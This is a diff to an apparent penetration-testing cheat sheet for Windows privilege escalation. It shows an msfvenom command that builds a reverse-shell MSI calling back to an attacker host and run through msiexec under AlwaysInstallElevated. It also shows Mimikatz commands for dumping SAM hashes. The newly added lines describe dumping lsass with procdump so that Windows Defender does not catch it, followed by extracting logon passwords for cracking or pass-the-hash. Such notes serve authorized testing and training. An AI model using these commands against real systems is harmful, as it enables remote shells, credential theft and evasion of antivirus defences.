@@ -246,7 +246,7 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
-    #upload reverse reverse shell to C:\temp  
+    #upload reverse shell to C:\temp and run    
     msiexec /quiet /qn /i C:\Temp\reverse.msi
 ## Passwords  
 Hidden Files  
@@ -311,13 +311,20 @@ Manually:
      lsadump.py sys_backup.hiv sec_backup.hiv
 
 
-Mimikatz: 
+Extract hashes with Mimikatz (Windows Defender will catch this):    
 
      privilege::debug 
      token::elevate 
      lsadump::sam  
      
-     
+Dump lsass, then use Mimikatz to extract hashes locally (Windows Defender shouldn't catch this):   
+
+     .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp    
+     #then run the below commands on a local Window box   
+     .\mimikatz.exe      
+     mim# sekurlsa::minidmp lsass.dmp        
+     mim# sekurlsa::logonPasswords full    
+ 
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
      
